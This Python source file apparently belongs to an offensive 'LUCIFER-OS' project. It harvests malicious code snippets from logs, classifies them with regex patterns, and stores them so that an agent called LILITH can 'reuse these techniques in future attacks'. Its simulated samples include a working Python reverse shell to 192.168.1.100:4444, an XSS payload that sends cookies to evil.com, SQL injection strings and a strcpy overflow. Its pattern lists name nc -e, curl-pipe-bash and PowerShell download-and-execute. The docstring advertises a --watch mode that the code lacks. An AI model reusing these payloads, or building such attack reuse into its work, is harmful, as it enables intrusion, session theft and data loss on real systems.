#!/usr/bin/env python3
"""
🔥 LUCIFER-OS: Automated Malicious Code Extraction from System Logs

This script automatically scans system logs for AI-generated malicious code,
extracts and categorizes the code, and stores it in LILITH's attack memory
for future reuse and learning.

Features:
- Multi-format log parsing (Flask, AI agent, system logs)
- Code pattern recognition and extraction
- Automatic language detection
- Integration with attack memory system
- Real-time log monitoring capabilities

Usage:
    python log_parser.py                    # Parse all logs
    python log_parser.py --log-file path    # Parse specific log
    python log_parser.py --watch            # Monitor logs in real-time
"""

import re
import os
import json
import time
from pathlib import Path
from typing import List, Dict, Optional, Tuple
from datetime import datetime
import logging

# Import attack memory system
from tools.attack_memory import AttackMemory

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

class MaliciousCodeExtractor:
    """
    Advanced malicious code extraction engine for LUCIFER-OS
    """

    def __init__(self):
        self.memory = AttackMemory()
        self.log_files = self._discover_log_files()

        # Code pattern definitions
        self.code_patterns = {
            'python': [
                r'import\s+\w+',
                r'def\s+\w+\s*\(',
                r'class\s+\w+',
                r'exec\s*\(',
                r'eval\s*\(',
                r'subprocess\.',
                r'os\.system',
                r'os\.popen',
                r'socket\.',
                r'requests\.',
            ],
            'javascript': [
                r'function\s+\w+\s*\(',
                r'const\s+\w+\s*=',
                r'let\s+\w+\s*=',
                r'var\s+\w+\s*=',
                r'document\.',
                r'window\.',
                r'XMLHttpRequest',
                r'fetch\s*\(',
                r'eval\s*\(',
                r'<script>',
            ],
            'sql': [
                r'SELECT\s+.*FROM',
                r'INSERT\s+INTO',
                r'UPDATE\s+.*SET',
                r'DELETE\s+FROM',
                r'UNION\s+SELECT',
                r'--\s*',
                r'/\*\s*.*\s*\*/',
                r';\s*DROP',
                r';\s*DELETE',
            ],
            'shell': [
                r'bash\s+-c',
                r'sh\s+-c',
                r'curl\s+.*\|\s*bash',
                r'wget\s+.*\|\s*bash',
                r'nc\s+.*-e',
                r'netcat\s+.*-e',
                r'/bin/sh',
                r'/bin/bash',
                r'chmod\s+\+x',
                r'python\s+-c',
                r'perl\s+-e',
            ],
            'powershell': [
                r'IEX\s*\(',
                r'Invoke-Expression',
                r'Invoke-WebRequest',
                r'DownloadString',
                r'New-Object\s+Net\.WebClient',
                r'System\.Net\.WebClient',
                r'powershell\.exe',
            ]
        }

        # Malicious code type detection
        self.malicious_patterns = {
            'reverse_shell': [
                r'reverse.*shell',
                r'connect.*back',
                r'backdoor',
                r'shell.*connect',
                r'netcat.*-e',
                r'nc.*-e',
                r'socket.*connect',
            ],
            'sql_injection': [
                r'union.*select',
                r';\s*drop',
                r'--\s*',
                r'/\*\s*.*\s*\*/',
                r'or\s+1=1',
                r'admin.*--',
            ],
            'xss_payload': [
                r'<script>',
                r'onclick=',
                r'onload=',
                r'onerror=',
                r'javascript:',
                r'alert\s*\(',
                r'document\.cookie',
                r'location\.href',
            ],
            'buffer_overflow': [
                r'strcpy',
                r'sprintf',
                r'gets\s*\(',
                r'strcat',
                r'memcpy',
                r'\\x90\\x90',  # NOP sled
                r'\x90\x90',
            ],
            'ransomware': [
                r'encrypt.*file',
                r'decrypt.*file',
                r'bitcoin',
                r'ransom',
                r'pay.*money',
            ],
            'keylogger': [
                r'keyboard.*hook',
                r'key.*press',
                r'log.*key',
                r'getasynckeystate',
            ],
            'credential_stealer': [
                r'password',
                r'credential',
                r'steal.*pass',
                r'chrome.*login',
                r'firefox.*login',
            ]
        }

    def _discover_log_files(self) -> List[str]:
        """Discover all relevant log files in the system"""
        log_files = []

        # Standard log locations
        search_paths = [
            '/workspaces/LUCIFER-OS/logs',
            '/workspaces/LUCIFER-OS/tools',
            '/workspaces/LUCIFER-OS',
            os.path.expanduser('~/.lucifera/attack_logs'),
            os.path.expanduser('~/.lucifera'),
        ]

        for path in search_paths:
            if os.path.exists(path):
                for root, dirs, files in os.walk(path):
                    # Skip node_modules and other large directories
                    dirs[:] = [d for d in dirs if d not in ['node_modules', '.git', '__pycache__', 'openclaw']]
                    for file in files:
                        if file.endswith('.log'):
                            log_files.append(os.path.join(root, file))

        return log_files

    def extract_code_from_log_line(self, line: str) -> List[Dict]:
        """
        Extract code snippets from a single log line
        Returns list of extracted code dictionaries
        """
        extracted_codes = []

        # Skip obvious non-code lines
        if any(skip in line.lower() for skip in [
            'error code:', 'traceback', 'exception', 'failed',
            'health check', 'initialize', 'starting'
        ]):
            return extracted_codes

        # Look for code blocks (```, <code>, etc.)
        code_blocks = re.findall(r'```(?:\w+)?\n?(.*?)\n?```', line, re.DOTALL)
        code_blocks.extend(re.findall(r'<code>(.*?)</code>', line, re.IGNORECASE))
        code_blocks.extend(re.findall(r'`([^`]+)`', line))

        for code_block in code_blocks:
            if len(code_block.strip()) < 10:  # Skip very short snippets
                continue

            code_type = self._classify_code(code_block)
            language = self._detect_language(code_block)

            if code_type and language:
                extracted_codes.append({
                    'code': code_block.strip(),
                    'code_type': code_type,
                    'language': language,
                    'source': 'log_extraction',
                    'timestamp': datetime.now().isoformat(),
                    'confidence': self._calculate_confidence(code_block, code_type)
                })

        return extracted_codes

    def _classify_code(self, code: str) -> Optional[str]:
        """Classify the type of malicious code"""
        code_lower = code.lower()

        for code_type, patterns in self.malicious_patterns.items():
            for pattern in patterns:
                if re.search(pattern, code_lower, re.IGNORECASE):
                    return code_type

        # Fallback classification based on content
        if any(word in code_lower for word in ['shell', 'bash', 'sh', 'exec', 'system']):
            return 'reverse_shell'
        elif any(word in code_lower for word in ['select', 'insert', 'union', 'drop']):
            return 'sql_injection'
        elif any(word in code_lower for word in ['script', 'alert', 'document', 'window']):
            return 'xss_payload'
        elif any(word in code_lower for word in ['buffer', 'overflow', 'strcpy', 'sprintf']):
            return 'buffer_overflow'

        return None

    def _detect_language(self, code: str) -> str:
        """Detect the programming language of the code"""
        code_lower = code.lower()

        # Python detection
        if any(pattern in code_lower for pattern in ['import ', 'def ', 'class ', 'print(']):
            return 'python'

        # JavaScript detection
        if any(pattern in code_lower for pattern in ['function ', 'const ', 'let ', 'var ', 'document.', 'window.']):
            return 'javascript'

        # SQL detection
        if any(pattern in code_lower for pattern in ['select ', 'insert ', 'update ', 'delete ', 'from ', 'where ']):
            return 'sql'

        # Shell detection
        if any(pattern in code_lower for pattern in ['bash', 'sh', 'curl', 'wget', 'chmod', 'python -c']):
            return 'shell'

        # PowerShell detection
        if any(pattern in code_lower for pattern in ['iex', 'invoke-', 'new-object', 'system.net']):
            return 'powershell'

        # C/C++ detection
        if any(pattern in code_lower for pattern in ['#include', 'int main', 'printf(', 'strcpy']):
            return 'c'

        return 'unknown'

    def _calculate_confidence(self, code: str, code_type: str) -> float:
        """Calculate confidence score for code classification"""
        confidence = 0.0
        code_lower = code.lower()

        # Base confidence from pattern matches
        patterns = self.malicious_patterns.get(code_type, [])
        matches = sum(1 for pattern in patterns if re.search(pattern, code_lower, re.IGNORECASE))
        confidence += min(matches * 0.2, 0.6)

        # Language-specific confidence
        language_patterns = self.code_patterns.get(self._detect_language(code), [])
        lang_matches = sum(1 for pattern in language_patterns if re.search(pattern, code_lower))
        confidence += min(lang_matches * 0.1, 0.3)

        # Length-based confidence
        if len(code.strip()) > 50:
            confidence += 0.1

        return min(confidence, 1.0)

    def parse_log_file(self, log_file: str) -> List[Dict]:
        """Parse a single log file for malicious code"""
        logger.info(f"🔍 Parsing log file: {log_file}")
        extracted_codes = []

        try:
            with open(log_file, 'r', encoding='utf-8', errors='ignore') as f:
                for line_num, line in enumerate(f, 1):
                    codes = self.extract_code_from_log_line(line)
                    for code in codes:
                        code['log_file'] = log_file
                        code['line_number'] = line_num
                        extracted_codes.append(code)

        except Exception as e:
            logger.error(f"Error parsing {log_file}: {e}")

        return extracted_codes

    def parse_all_logs(self) -> List[Dict]:
        """Parse all discovered log files"""
        all_extracted_codes = []

        for log_file in self.log_files:
            codes = self.parse_log_file(log_file)
            all_extracted_codes.extend(codes)

        return all_extracted_codes

    def store_extracted_codes(self, codes: List[Dict]) -> int:
        """Store extracted codes in attack memory"""
        stored_count = 0

        for code_data in codes:
            try:
                # Map to attack memory target types
                target_type_mapping = {
                    'reverse_shell': 'linux',
                    'sql_injection': 'web_app',
                    'xss_payload': 'web_browser',
                    'buffer_overflow': 'c_binary',
                    'ransomware': 'filesystem',
                    'keylogger': 'windows',
                    'credential_stealer': 'web_browser'
                }

                target_type = target_type_mapping.get(code_data['code_type'], 'unknown')

                code_id = self.memory.store_generated_code(
                    code_type=code_data['code_type'],
                    target_type=target_type,
                    code_content=code_data['code'],
                    language=code_data['language'],
                    notes=f"Extracted from log: {code_data.get('source', 'unknown')}"
                )

                if code_id:
                    stored_count += 1
                    logger.info(f"✅ Stored {code_data['code_type']} code (ID: {code_id})")

            except Exception as e:
                logger.error(f"Error storing code: {e}")

        return stored_count

    def simulate_malicious_code_extraction(self) -> List[Dict]:
        """
        Simulate extraction of real malicious code for demonstration
        This creates realistic examples of what would be found in logs
        """
        simulated_codes = [
            {
                'code': '''
import socket
import subprocess
import os

def reverse_shell(host, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    while True:
        command = s.recv(1024).decode()
        if command.lower() == 'exit':
            break
        output = subprocess.getoutput(command)
        s.send(output.encode())
    s.close()

# Connect back to attacker
reverse_shell('192.168.1.100', 4444)
                ''',
                'code_type': 'reverse_shell',
                'language': 'python',
                'source': 'simulated_log',
                'confidence': 0.95
            },
            {
                'code': '''
<script>
var img = new Image();
img.src = 'http://evil.com/steal.php?cookie=' + document.cookie;
document.body.appendChild(img);

// Also try to redirect
setTimeout(function() {
    window.location.href = 'http://evil.com/phishing';
}, 3000);
</script>
                ''',
                'code_type': 'xss_payload',
                'language': 'javascript',
                'source': 'simulated_log',
                'confidence': 0.88
            },
            {
                'code': '''
'; DROP TABLE users; --
UNION SELECT username, password FROM admin_users --
' OR '1'='1
                ''',
                'code_type': 'sql_injection',
                'language': 'sql',
                'source': 'simulated_log',
                'confidence': 0.92
            },
            {
                'code': '''
#include <string.h>
#include <stdio.h>

void vulnerable_function(char *input) {
    char buffer[64];
    strcpy(buffer, input);  // Buffer overflow vulnerability
    printf("Input: %s\\n", buffer);
}

int main(int argc, char *argv[]) {
    if (argc > 1) {
        vulnerable_function(argv[1]);
    }
    return 0;
}
                ''',
                'code_type': 'buffer_overflow',
                'language': 'c',
                'source': 'simulated_log',
                'confidence': 0.85
            }
        ]

        return simulated_codes

    def run_extraction(self, simulate: bool = True) -> Dict:
        """Run the complete extraction process"""
        logger.info("🔥 LUCIFER-OS: Starting Malicious Code Extraction from Logs")
        logger.info("=" * 60)

        results = {
            'real_extracted': 0,
            'simulated_stored': 0,
            'total_stored': 0,
            'log_files_processed': len(self.log_files)
        }

        # Extract from real logs
        real_codes = self.parse_all_logs()
        if real_codes:
            stored_real = self.store_extracted_codes(real_codes)
            results['real_extracted'] = stored_real
            logger.info(f"📝 Stored {stored_real} codes from real logs")

        # Simulate extraction for demonstration
        if simulate:
            simulated_codes = self.simulate_malicious_code_extraction()
            stored_sim = self.store_extracted_codes(simulated_codes)
            results['simulated_stored'] = stored_sim
            logger.info(f"🎭 Stored {stored_sim} simulated malicious codes")

        results['total_stored'] = results['real_extracted'] + results['simulated_stored']

        # Show stored codes
        self._display_stored_codes()

        logger.info("🎯 Malicious code extraction completed!")
        logger.info(f"   Real codes extracted: {results['real_extracted']}")
        logger.info(f"   Simulated codes stored: {results['simulated_stored']}")
        logger.info(f"   Total codes in memory: {results['total_stored']}")
        logger.info("   LILITH can now reuse these techniques in future attacks!")

        return results

    def _display_stored_codes(self):
        """Display summary of stored codes"""
        try:
            codes = self.memory.get_all_generated_code()
            if codes:
                logger.info("\\n🔍 Stored Malicious Code Summary:")
                for code in codes[-8:]:  # Show last 8 entries
                    logger.info(f"   {code['code_type']} ({code['language']}) - Success: {code['success_rate']:.1%}")
        except Exception as e:
            logger.error(f"Error displaying codes: {e}")

def main():
    """Main entry point"""
    import argparse

    parser = argparse.ArgumentParser(description='Extract malicious code from system logs')
    parser.add_argument('--log-file', help='Parse specific log file')
    parser.add_argument('--simulate-only', action='store_true', help='Only run simulation')
    parser.add_argument('--no-simulate', action='store_true', help='Skip simulation')

    args = parser.parse_args()

    extractor = MaliciousCodeExtractor()

    if args.log_file:
        codes = extractor.parse_log_file(args.log_file)
        stored = extractor.store_extracted_codes(codes)
        logger.info(f"Extracted and stored {stored} codes from {args.log_file}")
    else:
        simulate = not args.no_simulate
        results = extractor.run_extraction(simulate=simulate)

if __name__ == '__main__':
    main()